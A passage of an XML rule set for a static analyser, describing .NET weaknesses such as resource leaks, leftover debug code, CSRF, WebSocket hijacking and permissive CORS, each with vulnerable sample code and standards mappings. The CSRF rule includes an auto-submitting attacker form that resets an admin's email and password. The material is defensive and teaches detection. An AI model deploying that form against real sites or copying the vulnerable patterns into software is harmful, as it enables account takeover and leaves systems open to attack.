2:</b> Under normal conditions the following code executes a database query, processes the results returned by the database, and closes the allocated <code>SqlConnection</code> object. But if an exception occurs while executing the SQL or processing the results, the <code>SqlConnection</code> object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.<br><br><pre><br>        ...<br>	SqlConnection conn = new SqlConnection(connString);<br>	SqlCommand cmd = new SqlCommand(queryString);<br>	cmd.Connection = conn;<br>	conn.Open();<br>	SqlDataReader rdr = cmd.ExecuteReader();<br>	HarvestResults(rdr);<br>	conn.Connection.Close();<br>	...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_unreleased_resource_database</key>
    <internalKey>Code Quality/Unreleased Resource/Database</internalKey>
    <name>Unreleased Resource: Database</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a system resource.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example:</b> Under normal conditions the following code executes a database query, processes the results returned by the database, and closes the allocated <code>SqlConnection</code> object. But if an exception occurs while executing the SQL or processing the results, the <code>SqlConnection</code> object is not closed. If this happens often enough, the database will run out of available cursors and not be able to execute any more SQL queries.<br><br><pre><br>        ...<br>        SqlConnection conn = new SqlConnection(connString);<br>        SqlCommand cmd = new SqlCommand(queryString);<br>        cmd.Connection = conn;<br>        conn.Open();<br>        SqlDataReader rdr = cmd.ExecuteReader();<br>        HarvestResults(rdr);<br>        conn.Connection.Close();<br>        ...<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_unreleased_resource_streams</key>
    <internalKey>Code Quality/Unreleased Resource/Streams</internalKey>
    <name>Unreleased Resource: Streams</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program can potentially fail to release a system resource.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service attack by depleting the resource pool.<br><br><b>Example:</b> The following method never closes the file handle it opens. The <code>Finalize()</code> method for <code>StreamReader</code> eventually calls <code>Close()</code>, but there is no guarantee as to how long it will take before the <code>Finalize()</code> method is invoked. In fact, there is no guarantee that <code>Finalize()</code> will ever be invoked. In a busy environment, this can result in the VM using up all of its available file handles.<br><br><pre><br>private void processFile(string fName) {<br>        StreamWriter sw = new StreamWriter(fName);<br>        string line;<br>        while ((line = sr.ReadLine()) != null)<br>                processLine(line);<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_unreleased_resource_synchronization</key>
    <internalKey>Code Quality/Unreleased Resource/Synchronization</internalKey>
    <name>Unreleased Resource: Synchronization</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program fails to release a lock it holds, which might lead to deadlock.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program can potentially fail to release a system resource.<br><br>Resource leaks have at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br><br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>Most unreleased resource issues result in general software reliability problems, but if an attacker can intentionally trigger a resource leak, the attacker may be able to launch a denial of service by depleting the resource pool.<br><br><b>Example 1:</b> The following code establishes a lock before <code>performOperationInCriticalSection()</code>, but fails to release the lock if an exception is thrown in that method.<br><br><pre><br>Object synchronizationObject = new Object ();<br><br>System.Threading.Monitor.Enter(synchronizationObject);<br>performOperationInCriticalSection();<br>System.Threading.Monitor.Exit(synchronizationObject);<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 411</em> <br></p>
																									   <p>[8] Microsoft <em>MSDN - Programming Guide - Thread Synchronization</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>code_quality_unreleased_resource_unmanaged_object</key>
    <internalKey>Code Quality/Unreleased Resource/Unmanaged Object</internalKey>
    <name>Unreleased Resource: Unmanaged Object</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program fails to dispose of a managed object that utilizes unmanaged system resources.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  The program fails to properly dispose of a managed object that uses unmanaged system resources.<br>Failure to properly dispose of a managed object that uses unmanaged system resources has at least two common causes:<br><br>- Error conditions and other exceptional circumstances.<br>- Confusion over which part of the program is responsible for releasing the resource.<br><br>A small subset of managed .NET objects use unmanaged system resources.  .NET's Garbage Collector may not free the original managed objects in a predictable way.  As such, the application may run out of available memory as the Garbage Collector is unaware of the memory consumed by the unmanaged resources.  Most unmanaged resource leak issues result in general software reliability problems, but if an attacker can intentionally trigger an unmanaged resource leak, the attacker may be able to launch a denial of service attack by depleting the unmanaged resource pool.<br><br><b>Example 1:</b> The following method creates a managed Bitmap Object from an incoming stream <code>incomingStream</code>.  The Bitmap is manipulated and persisted to the outgoing stream <code>outgoingStream</code>.  The <code>Dispose()</code> method of <code>incomingBitmap</code> and <code>outgoingBitmap</code> is never explicitly called.<br><br>Normally, one can safely rely upon the Garbage Collector to do this at a safe time for managed objects that do not use unmanaged system resources.  The Garbage Collector calls <code>Bitmap.Dispose()</code> when it sees fit.  However, the <code>Bitmap</code> object utilizes scarce, unmanaged system resources.  The Garbage Collector may fail to call <code>Dispose()</code> before the unmanaged resource pool is depleted.<br><br><pre><br>private void processBitmap(Stream incomingStream, Stream outgoingStream, int thumbnailSize)<br>{<br>	Bitmap incomingBitmap = (Bitmap)System.Drawing.Image.FromStream(incomingStream);<br><br>	bool validBitmap = validateBitmap(incomingBitmap);<br>	if (!validBitmap)<br>		throw new ValidationException(incomingBitmap);<br><br>	Bitmap outgoingBitmap = new Bitmap(incomingBitmap, new Size(thumbnailSize, thumbnailSize));<br>	outgoingBitmap.Save(outgoingStream, ImageFormat.Bmp);<br>}<br></pre>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A9 Application Denial of Service</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP6080 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP6080 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP6080 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP6080 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP6080 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 404</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[10] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 404</em> <br></p>
																									   <p>[11] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-5 Denial of Service Protection (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>code-quality</tag>
  </rule>
  <rule>
    <key>encapsulation_asp_net_bad_practices_leftover_debug_code</key>
    <internalKey>Encapsulation/ASP.NET Bad Practices/Leftover Debug Code</internalKey>
    <name>ASP.NET Bad Practices: Leftover Debug Code</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Debug code can create unintended entry points in a deployed web application.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. When this sort of debug code is accidentally left in the application, the application is open to unintended modes of interaction. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.<br><br>The most common example of forgotten debug code is a <code>Main()</code> method appearing in a web application. Although this is an acceptable practice during product development, classes that are part of a production ASP.NET application should not define a <code>Main()</code>.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A6 Information Leakage and Improper Error Handling</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3620 CAT II</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3620 CAT II</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3620 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3620 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3620 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 489</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>
																									   <p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.6</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_cross_site_request_forgery</key>
    <internalKey>Encapsulation/Cross-Site Request Forgery</internalKey>
    <name>Cross-Site Request Forgery</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  HTTP requests must contain a user-specific secret in order to prevent an attacker from making unauthorized requests.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  A cross-site request forgery (CSRF) vulnerability occurs when:<br>1. A Web application uses session cookies.<br><br>2. The application acts on an HTTP request without verifying that the request was made with the user's consent.<br><br><br><br>A nonce is a cryptographic random value that is sent with a message to prevent replay attacks. If the request does not contain a nonce that proves its provenance, the code that handles the request is vulnerable to a CSRF attack (unless it does not change the state of the application.)  This means a Web application that uses session cookies has to take special precautions in order to ensure that an attacker can't trick users into submitting bogus requests. Imagine a Web application that allows administrators to modify their account as follows:<br><br><pre><br>public class UserProfileController : Controller<br>{<br>    public ViewResult SubmitUpdate()<br>    {<br>        // Get the user's existing profile data<br>        ProfileData profile = GetUserProfile();<br><br>        // Update the user object<br>        profile.EmailAddress = Request.Form["email"];<br>        profile.Password = Request.Form["password"];<br>        SaveUserProfile(profile);<br><br>        ViewData["message"] = "Your profile was updated.";<br>        return View();<br>    }<br>}<br></pre><br><br>The method above is missing the [ValidateAntiForgeryToken] attribute. An attacker might set up a malicious Web site that sends the following page to the user.<br><br><pre><br>&lt;body onload="document.getElementById('fm1').submit()"&gt;<br>    &lt;form id="fm1" action="http://yoursite/UserProfile/SubmitUpdate" method="post"&gt;<br>        &lt;input name="email" value="hacker@somewhere.evil" /&gt;<br>        &lt;input name="password" value="powned" /&gt;<br>    &lt;/form&gt;<br>&lt;/body><br></pre><br><br>If an administrator for the vulnerable site visits a page containing this code while she has an active session, she will unwittingly updated her account for the attacker. This is a CSRF attack. It is possible because the application does not have a way to determine the provenance of the request. Any request could be a legitimate action chosen by the user or a faked action set up by an attacker. The attacker does not get to see the Web page that the bogus request generates, so the attack technique is only useful for requests that alter the state of the application.<br><br>Most Web browsers send an HTTP header named <code>referer</code> along with each request. The <code>referer</code> header is supposed to contain the URL of the referring page, but attackers can forge it, so the referer header is not useful for determining the provenance of a request.<br><br>CSRF is entry number five on the 2007 OWASP Top 10 list.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] OWASP <em>2007 OWASP Top 10</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[10] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[12] A. Klein <em>Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[16] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[20] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_cross_site_websocket_hijacking</key>
    <internalKey>Encapsulation/Cross-Site WebSocket Hijacking</internalKey>
    <name>Cross-Site WebSocket Hijacking</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  <Paragraph>Server fails to verify request origin effectively accepting cross-domain requests which can be used by an attacker to hijack a bidirectional WebSocket connection.</Paragraph>
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Cross-Site WebSocket Hijacking occurs when a user is tricked into visiting a malicious site that will establish a WebSocket connection with a legitimate backend server. The initial HTTP request used to ask the server for upgrading to WebSocket protocol is a regular HTTP request and so, the browser will send any cookies bound to the target domain including any session cookies. If the server fails to verify the <code>Origin</code> header, it will allow any malicious site to impersonate the user and establish a bidirectional WebSocket connection without the user even noticing.<br>
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A5 Cross Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A5 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A8 Cross-Site Request Forgery (CSRF)</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3585 CAT II</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3585 CAT II</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3585 CAT II</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3585 CAT II</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3585 CAT II</em> <br></p>
																									   <p>[9] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Cross-Site Request Forgery</em> <br></p>
																									   <p>[10] Christian Schneider <em>Cross-Site WebSocket Hijacking</em> <br></p>
																									   <p>[11] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 352</em> <br></p>
																									   <p>[12] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[13] Standards Mapping - SANS Top 25 2010 - (SANS 2010) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[14] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Insecure Interaction - CWE ID 352</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.5</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.9</em> <br></p>
																									   <p>[19] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SC-23 Session Authenticity (P1)</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_html5_overly_permissive_cors_policy</key>
    <internalKey>Encapsulation/HTML5/Overly Permissive CORS Policy</internalKey>
    <name>HTML5: Overly Permissive CORS Policy</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program defines an overly permissive Cross-Origin Resource Sharing (CORS) policy.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Prior to HTML5, Web browsers enforced the Same Origin Policy which ensures that in order for JavaScript to access the contents of a Web page, both the JavaScript and the Web page must originate from the same domain. Without the Same Origin Policy, a malicious website could serve up JavaScript that loads sensitive information from other websites using a client's credentials, culls through it, and communicates it back to the attacker. HTML5 makes it possible for JavaScript to access data across domains if a new HTTP header called <code>Access-Control-Allow-Origin</code> is defined. With this header, a Web server defines which other domains are allowed to access its domain using cross-origin requests. However, caution should be taken when defining the header because an overly permissive CORS policy will allow a malicious application to communicate with the victim application in an inappropriate way, leading to spoofing, data theft, relay and other attacks.<br><br><b>Example 1:</b> Below is an example of using a wildcard to specify which domains the application is allowed to communicate with.<br><br><pre><br>  &lt;configuration&gt;<br>   &lt;system.webServer&gt;<br>     &lt;httpProtocol&gt;<br>       &lt;customHeaders&gt;<br>         &lt;add name="Access-Control-Allow-Origin" value="*" /&gt;<br>       &lt;/customHeaders&gt;<br>     &lt;/httpProtocol&gt;<br>   &lt;/system.webServer&gt;<br>  &lt;/configuration&gt;<br></pre><br><br>Using the <code>*</code> as the value of the <code>Access-Control-Allow-Origin</code> header indicates that the application's data is accessible to JavaScript running on any domain.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Philippe De Ryck, Lieven Desmet, Pieter Philippaerts, and Frank Piessens <em>A Security Analysis of Next Generation Web Standards</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A5 Security Misconfiguration</em> <br></p>
																									   <p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-4 Information Flow Enforcement (P1)</em> <br></p>
																									   <p>[4] W3C <em>Cross-Origin Resource Sharing</em> <br></p>
																									   <p>[5]  <em>Enable Cross-Origin Resource Sharing</em> <br></p>
																									   <p>[6] Michael Schmidt <em>HTML5 Web Security</em> <br></p>
																									   <p>[7] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[8] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.10</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_hidden_field</key>
    <internalKey>Encapsulation/Hidden Field</internalKey>
    <name>Hidden Field</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  The program creates a hidden form field.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Programmers often trust the contents of hidden fields, expecting that users will not be able to view them or manipulate their contents.  Attackers will violate these assumptions.  They will examine the values written to hidden fields and alter them or replace the contents with attack data.<br><br><br><br><b>Example:</b><br><pre><br>  HtmlInputHidden hidden = new HtmlInputHidden();<br></pre><br><br>If hidden fields carry sensitive information, this information will be cached the same way the rest of the page is cached.  This can lead to sensitive information being tucked away in the browser cache without the user's knowledge.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3610 CAT I</em> <br></p>
																									   <p>[2] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3610 CAT I</em> <br></p>
																									   <p>[3] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3610 CAT I</em> <br></p>
																									   <p>[4] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3610 CAT I</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3610 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 472, CWE ID 642</em> <br></p>
																									   <p>[7]  <em>Input Validation and Representation</em> Fortify, An HP Company<br></p>
																									   <p>[8] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M4 Unintended Data Leakage</em> <br></p>
																									   <p>[9] Standards Mapping - SANS Top 25 2009 - (SANS 2009) <em>Risky Resource Management - CWE ID 642</em> <br></p>]]></description>
    <severity>MAJOR</severity>
    <tag>encapsulation</tag>
  </rule>
  <rule>
    <key>encapsulation_javascript_hijacking_vulnerable_framework</key>
    <internalKey>Encapsulation/JavaScript Hijacking/Vulnerable Framework</internalKey>
    <name>JavaScript Hijacking: Vulnerable Framework</name>
    <description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Applications that leverage Microsoft AJAX.NET (Atlas) can be vulnerable to JavaScript hijacking, which allows an unauthorized attacker to read confidential data.
							</p>
							<h2>EXPLANATION</h2>
							<p>
